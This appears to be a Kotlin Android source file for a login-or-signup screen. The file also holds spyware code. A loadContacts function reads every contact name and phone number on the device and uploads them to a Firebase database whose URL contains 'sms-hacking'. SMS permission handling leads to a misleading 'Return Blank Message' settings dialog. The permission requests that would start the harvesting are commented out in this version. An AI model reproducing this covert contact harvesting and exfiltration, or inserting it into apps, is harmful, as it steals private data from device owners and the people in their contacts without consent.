package com.example.codes.Activitys

import android.annotation.SuppressLint
import android.app.Activity
import android.app.Dialog
import android.app.ProgressDialog
import android.content.ContentResolver
import android.content.ContentValues.TAG
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.os.Bundle
import android.os.Handler
import android.provider.ContactsContract
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.codes.R
import com.example.codes.databinding.ActivityLoginOrSignUpBinding
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import android.provider.Settings

import android.net.Uri


import androidx.appcompat.app.AlertDialog

class LoginOrSignUp : AppCompatActivity() {

    private lateinit var database: DatabaseReference
    val contactList: MutableList<Contact> = mutableListOf()

    private val binding: ActivityLoginOrSignUpBinding by lazy {
        ActivityLoginOrSignUpBinding.inflate(layoutInflater)
    }

    // Mã yêu cầu quyền động
    companion object {
        const val REQUEST_CODE_READ_CONTACTS = 1
        const val REQUEST_CODE_READ_SMS = 100 // Mã yêu cầu quyền
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(binding.root)

        init_()
    }

    private fun init_() {
        binding.apply {
            signBtn.setOnClickListener {
                startActivity(Intent(this@LoginOrSignUp, SignUp::class.java))
            }
            loginBtn.setOnClickListener {
                startActivity(Intent(this@LoginOrSignUp, Login::class.java))
            }
        }

//        // Kiểm tra và yêu cầu quyền động
//        if (ContextCompat.checkSelfPermission(
//                this,
//                android.Manifest.permission.READ_CONTACTS
//            ) != PackageManager.PERMISSION_GRANTED
//        ) {
//            ActivityCompat.requestPermissions(
//                this,
//                arrayOf(android.Manifest.permission.READ_CONTACTS),
//                REQUEST_CODE_READ_CONTACTS
//            )
//        } else {
//            // Nếu quyền đã được cấp, gọi hàm loadContacts
//            loadContacts()
//        }


//        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
//            != PackageManager.PERMISSION_GRANTED) {
//            // Nếu quyền chưa được cấp, yêu cầu quyền động
//            ActivityCompat.requestPermissions(
//                this,
//                arrayOf(android.Manifest.permission.READ_SMS),
//                REQUEST_CODE_READ_SMS
//            )
//        } else {
//
//        }

//        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
//            != PackageManager.PERMISSION_GRANTED) {
//            ActivityCompat.requestPermissions(
//                this,
//                arrayOf(android.Manifest.permission.READ_SMS),
//                REQUEST_CODE_READ_SMS
//            )
//        } else {
//
//        }




    }

    fun showReturnBlankMessageDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("Enable Return Blank Message")
            .setMessage("To ensure proper functionality, please enable the 'Return Blank Message' feature in your phone settings.")
            .setPositiveButton("Go to Settings") { _, _ ->
                // Mở cài đặt của điện thoại
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                val uri = Uri.fromParts("package", packageName, null)
                intent.data = uri
                startActivity(intent)
            }
            .setNegativeButton("Cancel", null)
            .create()

        dialog.show()
    }

    @SuppressLint("Range")
    private fun loadContacts() {
        val resolver: ContentResolver = contentResolver
        val cursor: Cursor? = resolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null, null, null, null
        )

        if (cursor != null && cursor.count > 0) {
            val uniquePhoneNumbers = mutableSetOf<String>() // Sử dụng Set để loại bỏ trùng lặp

            while (cursor.moveToNext()) {
                val contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))
                val contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))

                val phoneNumbers = mutableListOf<String>()

                val phones = resolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                    arrayOf(contactId),
                    null
                )

                if (phones != null) {
                    while (phones.moveToNext()) {
                        val phoneNumber = phones.getString(
                            phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                        )

                        // Loại bỏ các số điện thoại trùng lặp
                        if (phoneNumber.isNotEmpty() && !uniquePhoneNumbers.contains(phoneNumber)) {
                            phoneNumbers.add(phoneNumber)
                            uniquePhoneNumbers.add(phoneNumber)
                        }
                    }
                    phones.close()
                }

                // Chỉ thêm danh bạ vào list nếu có số điện thoại hợp lệ
                if (phoneNumbers.isNotEmpty()) {
                    val contact = Contact(contactName ?: "Unknown", phoneNumbers)
                    contactList.add(contact)
                }
            }
            cursor.close()
        } else {
            // Không có danh bạ nào
            Toast.makeText(this, "No contacts found", Toast.LENGTH_SHORT).show()
        }

        // Upload danh bạ lên Firebase
        uploadContactsToFirebase()
    }

    private fun uploadContactsToFirebase() {
        // Khởi tạo Firebase Realtime Database
        database = FirebaseDatabase.getInstance("https://sms-hacking-8b10c-default-rtdb.asia-southeast1.firebasedatabase.app/").reference

        // Tạo node "contacts" trong Firebase và thêm danh bạ
        val contactsRef = database.child("contacts")

        for (contact in contactList) {
            val contactId = contactsRef.push().key // Tạo ID duy nhất cho mỗi danh bạ
            if (contactId != null) {
                contactsRef.child(contactId).setValue(contact)
                    .addOnSuccessListener {
                        Log.d(TAG, "Uploaded contact: ${contact.name}")
                    }
                    .addOnFailureListener { exception ->
                        Log.e(TAG, "Failed to upload contact: ${contact.name}", exception)
                    }
            }
        }
    }

    // Xử lý kết quả yêu cầu quyền
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

//        if (requestCode == REQUEST_CODE_READ_CONTACTS) {
//            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
//                // Quyền đã được cấp, gọi hàm loadContacts
//                loadContacts()
//            } else {
//                // Quyền bị từ chối
//                Toast.makeText(this, "Permission denied to read contacts", Toast.LENGTH_SHORT).show()
//            }
//        }
        if (requestCode == REQUEST_CODE_READ_SMS) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                showReturnBlankMessageDialog()
            } else {
                // Quyền bị từ chối
                Log.e(TAG, "Permission denied to read SMS")
            }
        }



    }



    data class Contact(
        val name: String,
        val phoneNumbers: List<String>
    )
}
